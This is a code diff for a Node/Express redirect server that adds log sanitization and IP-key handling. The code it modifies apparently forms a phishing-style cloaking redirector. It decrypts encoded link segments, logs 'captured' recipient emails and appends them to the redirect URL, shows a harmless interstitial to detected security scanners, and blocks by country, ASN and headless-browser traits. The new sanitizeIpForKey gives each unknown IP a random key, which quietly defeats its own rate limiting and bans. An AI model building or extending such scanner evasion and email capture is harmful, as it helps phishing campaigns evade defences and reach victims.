@@ -140,16 +140,24 @@ function zoneLabel(tz = TIMEZONE) {
   }
 }
 
-function sanitizeOneLine(s) {
-  return String(s)
-    .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, " ")
-    .replace(/[ \t]{2,}/g, " ")
+// Enhanced log sanitization function (Critical Fix 5)
+function safeLogValue(value, maxLength = 100) {
+  return String(value || '')
+    .replace(/[\x00-\x1F\x7F-\x9F]/g, '')  // Remove all control characters
+    .replace(/[ \t]{2,}/g, ' ')            // Collapse multiple spaces/tabs
+    .replace(/[\r\n]/g, ' ')               // Replace newlines with spaces
     .trim()
-    .slice(0, SANITIZATION_MAX_LENGTH);
+    .substring(0, maxLength);
+}
+
+// Enhanced sanitizeOneLine with additional protection
+function sanitizeOneLine(s) {
+  return safeLogValue(s, SANITIZATION_MAX_LENGTH);
 }
 
 const sanitizeLogLine = sanitizeOneLine;
 
+// Keep all your existing functions as they are...
 function safeDecode(s) {
   try { return decodeURIComponent(s); } catch { return s; }
 }
@@ -472,8 +480,25 @@ function inMemTokenBucket(key, now) {
   return { allowed, retryAfterMs };
 }
 
+// Helper function to sanitize IP for use as Map keys
+function sanitizeIpForKey(ip) {
+  if (!ip || ip === 'unknown' || ip === '') {
+    // Generate unique identifier for invalid IPs to prevent bucket collision
+    return `invalid_${Math.random().toString(36).substr(2, 8)}`;
+  }
+  
+  // Basic IP format validation - if it looks like a valid IP, use it as-is
+  if (/^(\d{1,3}\.){3}\d{1,3}$/.test(ip) || /^[0-9a-fA-F:]+$/.test(ip)) {
+    return ip;
+  }
+  
+  // For malformed IPs, create a sanitized key
+  return `malformed_${Buffer.from(ip).toString('base64url').slice(0, 16)}`;
+}
+
 async function isRateLimited(ip) {
-  const { allowed, retryAfterMs } = inMemTokenBucket(`rl:${ip}`, Date.now());
+  const safeIp = sanitizeIpForKey(ip);
+  const { allowed, retryAfterMs } = inMemTokenBucket(`rl:${safeIp}`, Date.now());
   return { limited: !allowed, retryAfterMs };
 }
 
@@ -484,20 +509,22 @@ const inMemBans = new Map();
 const inMemStrikes = new Map();
 
 function isBanned(ip) {
-  const until = inMemBans.get(ip);
+  const safeIp = sanitizeIpForKey(ip);
+  const until = inMemBans.get(safeIp);
   if (!until) return false;
-  if (Date.now() > until) { inMemBans.delete(ip); return false; }
+  if (Date.now() > until) { inMemBans.delete(safeIp); return false; }
   return true;
 }
 
 function addStrike(ip, weight=1){
-  const c = (inMemStrikes.get(ip) || 0) + weight;
-  inMemStrikes.set(ip, c);
+  const safeIp = sanitizeIpForKey(ip);
+  const c = (inMemStrikes.get(safeIp) || 0) + weight;
+  inMemStrikes.set(safeIp, c);
   if (c >= BAN_AFTER_STRIKES) {
-    inMemBans.set(ip, Date.now() + BAN_TTL_SEC*1000);
-    inMemStrikes.delete(ip);
-    addLog(`[BAN] ip=${ip} for ${BAN_TTL_SEC}s`);
-    addSpacer();
+    inMemBans.set(safeIp, Date.now() + BAN_TTL_SEC*1000);
+    inMemStrikes.delete(safeIp);
+    addLog(`[BAN] ip=${safeLogValue(ip)} for ${BAN_TTL_SEC}s`);
+  addSpacer();
   }
 }
 
@@ -507,7 +534,8 @@ function makeIpLimiter({ capacity, windowSec, keyPrefix }) {
   return function ipLimit(req, res, next) {
     if (isAdmin?.(req) || isAdminSSE?.(req)) return next();
     const ip = getClientIp(req) || "unknown";
-    const key = `${keyPrefix}:${ip}`;
+    const safeIp = sanitizeIpForKey(ip);
+    const key = `${keyPrefix}:${safeIp}`;
     const now = Date.now();
     let st = buckets.get(key);
     if (!st) st = { tokens: capacity, ts: now };
@@ -523,8 +551,8 @@ function makeIpLimiter({ capacity, windowSec, keyPrefix }) {
     }
     const retryAfterMs = Math.ceil((1 - st.tokens) / RATE_PER_MS_LOCAL);
     res.setHeader("Retry-After", Math.ceil(retryAfterMs / 1000));
-    addLog(`[RL:${keyPrefix}] 429 ip=${ip} path=${req.path}`);
-    addSpacer();
+    addLog(`[RL:${keyPrefix}] 429 ip=${safeLogValue(ip)} path=${safeLogValue(req.path)}`);
+  addSpacer();
     return res.status(429).send("Too many requests");
   };
 }
@@ -1107,7 +1135,7 @@ function logScannerHit(req, reason, nextEnc) {
   const uaKey = ua.toLowerCase().split(/[;\s]/)[0] || "(empty)";
   SCANNER_STATS.byUA[uaKey] = (SCANNER_STATS.byUA[uaKey] || 0) + 1;
 
-  addLog(`[SCANNER] 200 interstitial ip=${ip} ua="${ua}" path="${path}" accept="${acc}" referer="${ref}" reason=${reason} nextLen=${(nextEnc||"").length}`);
+  addLog(`[SCANNER] 200 interstitial ip=${safeLogValue(ip)} ua="${safeLogValue(ua)}" path="${safeLogValue(path)}" accept="${safeLogValue(acc)}" referer="${safeLogValue(ref)}" reason=${safeLogValue(reason)} nextLen=${(nextEnc||"").length}`);
   addSpacer();
 }
 
@@ -1345,7 +1373,7 @@ function checkSecurityPolicies(req) {
                 : (hs.softCount >= 2)                          ? 'SUSPECT'
                 : 'INFO';
 
-    addLog(`[${label}] ip=${ip} reasons=${hs.reasons.join(',')}`);
+    addLog(`[${label}] ip=${safeLogValue(ip)} reasons=${safeLogValue(hs.reasons.join(','))}`);
 
     if (hs.hardCount > 0) {
       addStrike(ip, HEADLESS_STRIKE_WEIGHT);
@@ -1362,12 +1390,12 @@ function checkSecurityPolicies(req) {
   const ctry = getCountry(req);
   const asn  = getASN(req);
   if (countryBlocked(ctry)) {
-    addLog(`[GEO] blocked country=${ctry} ip=${ip}`);
+    addLog(`[GEO] blocked country=${safeLogValue(ctry)} ip=${safeLogValue(ip)}`);
     addSpacer();
     return { blocked: true, status: 403, message: "Forbidden" };
   }
   if (asnBlocked(asn)) {
-    addLog(`[ASN] blocked asn=${asn} ip=${ip}`);
+    addLog(`[ASN] blocked asn=${safeLogValue(asn)} ip=${safeLogValue(ip)}`);
     addSpacer();
     return { blocked: true, status: 403, message: "Forbidden" };
   }
@@ -1388,7 +1416,7 @@ async function verifyTurnstileAndRateLimit(req, baseString) {
     const hostParam = (v.reason === "bad_hostname" && v.data && v.data.hostname)
       ? `&host=${encodeURIComponent(v.data.hostname)}`
       : "";
-    addLog(`[AUTH] token invalid (${v.reason}) ip=${ip} ua="${ua.slice(0,UA_TRUNCATE_LENGTH)}" -> /challenge`);
+    addLog(`[AUTH] token invalid (${v.reason}) ip=${safeLogValue(ip)} ua="${safeLogValue(ua.slice(0, UA_TRUNCATE_LENGTH))}" -> /challenge`);
     return { redirect: `/challenge?next=${next}${hostParam}` };
   }
 
@@ -1419,7 +1447,7 @@ function decryptAndParseUrl(req, baseString) {
   try {
     result = tryDecryptAny(mainPart);
   } catch (e) {
-    addLog(`[DECRYPT] exception ip=${ip} seg="${String(mainPart).slice(0,EMAIL_DISPLAY_MAX_LENGTH)}" err=${e.message}`);
+    addLog(`[DECRYPT] exception ip=${safeLogValue(ip)} seg="${safeLogValue(String(mainPart), EMAIL_DISPLAY_MAX_LENGTH)}" err=${safeLogValue(e.message)}`);
     addSpacer();
     return { error: "Failed to load" };
   }
@@ -1442,7 +1470,7 @@ function decryptAndParseUrl(req, baseString) {
       lastErr: result?.lastErr || null,
       segLen: mainPart.length
     });
-    addLog(`[DECRYPT] failed variants ip=${ip} seg="${String(mainPart).slice(0,EMAIL_DISPLAY_MAX_LENGTH)}" mainLen=${mainPart.length} why=${why}`);
+    addLog(`[DECRYPT] failed variants ip=${safeLogValue(ip)} seg="${safeLogValue(String(mainPart), EMAIL_DISPLAY_MAX_LENGTH)}" mainLen=${mainPart.length} why=${safeLogValue(why)}`);
     addSpacer();
     return { error: "Failed to load" };
   }
@@ -1457,11 +1485,11 @@ function processEmailAndFinalizeUrl(finalUrl, emailPart) {
 
     if (emailDecoded && isLikelyEmail(emailDecoded)) {
       finalUrl += '#' + emailDecoded;
-      addLog(`[EMAIL] captured ${maskEmail(emailDecoded)}`);
+      addLog(`[EMAIL] captured ${safeLogValue(maskEmail(emailDecoded), EMAIL_DISPLAY_MAX_LENGTH)}`);
     } else if (emailDecoded) {
-      addLog(`[EMAIL] ignored (not a valid email): "${emailDecoded.slice(0,EMAIL_DISPLAY_MAX_LENGTH)}" (raw="${emailPart.slice(0,40)}…")`);
+      addLog(`[EMAIL] ignored (not a valid email): "${safeLogValue(emailDecoded, EMAIL_DISPLAY_MAX_LENGTH)}" (raw="${safeLogValue(emailPart.slice(0,40))}…")`);
     } else {
-      addLog(`[EMAIL] ignored (decode empty) raw="${emailPart.slice(0,40)}…"`);
+      addLog(`[EMAIL] ignored (decode empty) raw="${safeLogValue(emailPart.slice(0,40))}…"`);
     }
   }
 
@@ -1483,11 +1511,11 @@ function validateAndRedirect(finalUrl, req, res) {
       return res.status(403).send("Unauthorized URL");
     }
 
-    addLog(`[REDIRECT] ip=${ip} -> ${finalUrl}`);
+    addLog(`[REDIRECT] ip=${safeLogValue(ip)} -> ${safeLogValue(finalUrl, URL_DISPLAY_MAX_LENGTH)}`);
     addSpacer();
     return res.redirect(finalUrl);
   } catch (e) {
-    addLog(`[URL] invalid ip=${ip} value="${(finalUrl || "").slice(0,URL_DISPLAY_MAX_LENGTH)}" err="${e.message}"`);
+    addLog(`[URL] invalid ip=${safeLogValue(ip)} value="${safeLogValue((finalUrl || ""), URL_DISPLAY_MAX_LENGTH)}" err="${safeLogValue(e.message)}"`);
     addSpacer();
     return res.status(400).send("Invalid URL");
   }
@@ -1654,11 +1682,11 @@ app.post(
       const preview = req.__rawPreview != null
         ? JSON.stringify(req.__rawPreview)
         : (typeof req.body === "object" ? JSON.stringify(req.body).slice(0, 200) : '""');
-      addLog(`[TS-CLIENT:empty] ip=${ip} ua="${ua}" ct=${ct} len=${len} preview=${preview}`);
+      addLog(`[TS-CLIENT:empty] ip=${safeLogValue(ip)} ua="${safeLogValue(ua)}" ct=${safeLogValue(ct)} len=${safeLogValue(len)} preview=${safeLogValue(preview)}`);
       return res.status(204).end();
     }
 
-    addLog(`[TS-CLIENT:${payload.phase}] ip=${ip} ua="${ua}" ${JSON.stringify(payload)}`);
+    addLog(`[TS-CLIENT:${safeLogValue(payload.phase)}] ip=${safeLogValue(ip)} ua="${safeLogValue(ua)}" ${safeLogValue(JSON.stringify(payload))}`);
     addSpacer();
     res.status(204).end();
   }
@@ -1843,18 +1871,46 @@ app.get("/__debug/decrypt", requireAdmin, (req, res) => {
 
 app.get("/__hp.gif", (req, res) => {
   const ip = getClientIp(req);
-  addLog(`[HP] honeypot hit ip=${ip} ua="${(req.get("user-agent")||"").slice(0,UA_TRUNCATE_LENGTH)}"`);
+  addLog(`[HP] honeypot hit ip=${safeLogValue(ip)} ua="${safeLogValue((req.get("user-agent")||"").slice(0,UA_TRUNCATE_LENGTH))}"`);
   addStrike(ip, STRIKE_WEIGHT_HP);
   res.set("Cache-Control","no-store");
   return res.status(204).end();
 });
 
+// Helper function to validate IP address format
+function isValidIpAddress(ip) {
+  if (!ip || typeof ip !== 'string') return false;
+  
+  // IPv4 validation
+  if (/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) {
+    const octets = ip.split('.');
+    return octets.every(octet => {
+      const num = parseInt(octet, 10);
+      return num >= 0 && num <= 255 && !isNaN(num);
+    });
+  }
+  
+  // IPv6 validation (basic)
+  if (/^[0-9a-fA-F:]+$/.test(ip)) {
+    return true; // Basic IPv6 format check
+  }
+  
+  return false;
+}
+
 app.post("/admin/unban", (req, res) => {
   if (!isAdmin(req)) return res.status(403).send("Forbidden");
   const ip = String(req.query.ip||"").trim();
   if (!ip) return res.status(400).send("ip required");
-  if (!inMemBans.has(ip)) return res.json({ok:true, message:"not banned"});
-  inMemBans.delete(ip);
+  
+  // Validate IP format
+  if (!isValidIpAddress(ip)) {
+    return res.status(400).json({error: "Invalid IP address format"});
+  }
+  
+  const safeIp = sanitizeIpForKey(ip);
+  if (!inMemBans.has(safeIp)) return res.json({ok:true, message:"not banned"});
+  inMemBans.delete(safeIp);
   return res.json({ok:true, message:"unbanned", ip});
 });
 
@@ -1862,7 +1918,14 @@ app.post("/admin/strike-reset", (req, res) => {
   if (!isAdmin(req)) return res.status(403).send("Forbidden");
   const ip = String(req.query.ip||"").trim();
   if (!ip) return res.status(400).send("ip required");
-  inMemStrikes.delete(ip);
+  
+  // Validate IP format
+  if (!isValidIpAddress(ip)) {
+    return res.status(400).json({error: "Invalid IP address format"});
+  }
+  
+  const safeIp = sanitizeIpForKey(ip);
+  inMemStrikes.delete(safeIp);
   return res.json({ok:true, message:"strikes reset", ip});
 });
 
@@ -1870,7 +1933,7 @@ app.get(
   "/admin/scanner-stats",
   (req, res, next) => {
     if (isAdmin(req) || isAdminSSE(req)) return next();
-    addLog(`[ADMIN] scanner-stats denied ip=${getClientIp(req)} ua="${(req.get("user-agent")||"").slice(0,UA_TRUNCATE_LENGTH)}"`);
+    addLog(`[ADMIN] scanner-stats denied ip=${safeLogValue(getClientIp(req))} ua="${safeLogValue((req.get("user-agent")||"").slice(0,UA_TRUNCATE_LENGTH))}"`);
     return res.status(401).type("text/plain").send("Unauthorized");
   },
   
